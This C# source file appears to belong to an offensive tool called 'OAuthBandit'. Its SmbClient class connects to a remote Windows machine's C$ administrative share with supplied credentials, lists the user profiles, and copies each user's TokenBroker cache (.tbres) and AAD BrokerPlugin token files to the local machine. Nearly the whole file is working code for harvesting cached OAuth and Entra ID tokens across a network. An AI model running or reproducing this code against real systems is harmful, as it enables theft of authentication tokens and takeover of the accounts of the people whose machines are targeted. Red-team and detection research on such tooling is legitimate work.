using System.Runtime.InteropServices;

namespace OAuthBandit.Remote;

public class SmbClient : IDisposable
{
    private const string TbresPath = @"Users\{0}\AppData\Local\Microsoft\TokenBroker\Cache";
    private const string WamPath = @"Users\{0}\AppData\Local\Packages";

    private readonly string _target;
    private readonly string _username;
    private readonly string? _password;
    private readonly string _domain;
    private readonly string? _nthash;
    private string? _uncPath;
    private bool _connected;

    // P/Invoke for WNetAddConnection2 / WNetCancelConnection2
    [DllImport("mpr.dll", CharSet = CharSet.Unicode)]
    private static extern int WNetAddConnection2(ref NETRESOURCE netResource, string? password, string? username, int flags);

    [DllImport("mpr.dll", CharSet = CharSet.Unicode)]
    private static extern int WNetCancelConnection2(string name, int flags, bool force);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct NETRESOURCE
    {
        public int dwScope;
        public int dwType;
        public int dwDisplayType;
        public int dwUsage;
        public string? lpLocalName;
        public string lpRemoteName;
        public string? lpComment;
        public string? lpProvider;
    }

    public SmbClient(string target, string username, string? password = null,
        string domain = "", string? nthash = null)
    {
        _target = target;
        _username = username;
        _password = password;
        _domain = domain;
        _nthash = nthash;
    }

    public bool Connect()
    {
        try
        {
            _uncPath = $@"\\{_target}\C$";
            var nr = new NETRESOURCE
            {
                dwType = 1, // RESOURCETYPE_DISK
                lpRemoteName = _uncPath
            };

            var user = string.IsNullOrEmpty(_domain) ? _username : $@"{_domain}\{_username}";
            int result = WNetAddConnection2(ref nr, _password, user, 0);

            if (result == 0 || result == 1219) // 0=OK, 1219=already connected
            {
                _connected = true;
                return true;
            }

            Console.WriteLine($"    [!] SMB connection failed to {_target}: error {result}");
            return false;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"    [!] SMB connection failed to {_target}: {ex.Message}");
            return false;
        }
    }

    public List<string> ListUsers()
    {
        var users = new List<string>();
        if (!_connected || _uncPath == null) return users;

        try
        {
            var usersDir = Path.Combine(_uncPath, "Users");
            if (!Directory.Exists(usersDir)) return users;

            var exclude = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
                { ".", "..", "Public", "Default", "Default User", "All Users" };

            foreach (var dir in Directory.GetDirectories(usersDir))
            {
                var name = Path.GetFileName(dir);
                if (!exclude.Contains(name))
                    users.Add(name);
            }
        }
        catch { }

        return users;
    }

    public List<string> DownloadTbresFiles(string user, string localDir)
    {
        var downloaded = new List<string>();
        if (!_connected || _uncPath == null) return downloaded;

        try
        {
            var remotePath = Path.Combine(_uncPath, string.Format(TbresPath, user));
            if (!Directory.Exists(remotePath)) return downloaded;

            foreach (var file in Directory.GetFiles(remotePath, "*.tbres"))
            {
                var filename = Path.GetFileName(file);
                var localFile = Path.Combine(localDir, $"{_target}_{user}_{filename}");
                try
                {
                    File.Copy(file, localFile, true);
                    downloaded.Add(localFile);
                }
                catch { }
            }
        }
        catch { }

        return downloaded;
    }

    public List<string> DownloadWamFiles(string user, string localDir)
    {
        var downloaded = new List<string>();
        if (!_connected || _uncPath == null) return downloaded;

        try
        {
            var packagesPath = Path.Combine(_uncPath, string.Format(WamPath, user));
            if (!Directory.Exists(packagesPath)) return downloaded;

            foreach (var brokerDir in Directory.GetDirectories(packagesPath, "Microsoft.AAD.BrokerPlugin_*"))
            {
                var localStatePath = Path.Combine(brokerDir, "LocalState");
                if (!Directory.Exists(localStatePath)) continue;

                foreach (var file in Directory.GetFiles(localStatePath))
                {
                    var name = Path.GetFileName(file).ToLowerInvariant();
                    if (!name.EndsWith(".def") && !name.StartsWith("p_") && !name.StartsWith("a_"))
                        continue;

                    var localFile = Path.Combine(localDir, $"{_target}_{user}_{Path.GetFileName(file)}");
                    try
                    {
                        File.Copy(file, localFile, true);
                        downloaded.Add(localFile);
                    }
                    catch { }
                }
            }
        }
        catch { }

        return downloaded;
    }

    public void Dispose()
    {
        if (_connected && _uncPath != null)
        {
            try { WNetCancelConnection2(_uncPath, 0, true); }
            catch { }
        }
    }
}
